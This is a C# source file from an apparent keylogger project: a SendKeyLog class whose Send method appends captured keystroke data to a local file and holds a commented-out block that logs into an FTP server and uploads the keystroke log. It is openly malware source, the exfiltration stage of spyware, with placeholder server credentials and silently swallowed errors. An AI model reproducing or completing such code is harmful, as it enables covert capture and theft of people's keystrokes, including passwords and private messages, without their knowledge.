using Limilabs.FTP.Client;
using System;
using System.IO;


namespace KeyLogger
{
    public static class SendKeyLog
    {
        private static string _ipAddress = "";//ip
        private static string _login = "";//login
        private static string _password = "";//pass
        private static string _path = "f:\\ks.txt";//pass
        private static string _logFolder = "myLogs";//Folder with logs on FTP server

        public static void Send(MemoryStream ms)
        {

            try//
            {
                Console.WriteLine("Start loading log on FTP.");
                byte[] bt = ms.GetBuffer();

                //FileStream fs = new FileStream("", FileMode.Create);
                //fs.Write(bt, 0, bt.Length);

                using (FileStream FS = new FileStream(_path, File.Exists(_path) ? FileMode.Append : FileMode.OpenOrCreate, FileAccess.Write))
                {
                    FS.Write(bt, 0, bt.Length);
                    FS.Close();
                }


                /*Ftp ftp = new Ftp();
                ftp.Connect(_ipAddress);
                ftp.Login(_login, _password);
                ftp.ChangeFolder(_logFolder);
                ftp.UploadUnique(ms);
                ftp.UploadUnique(bt);*/
            }
            catch
            { }
        }
    }
}
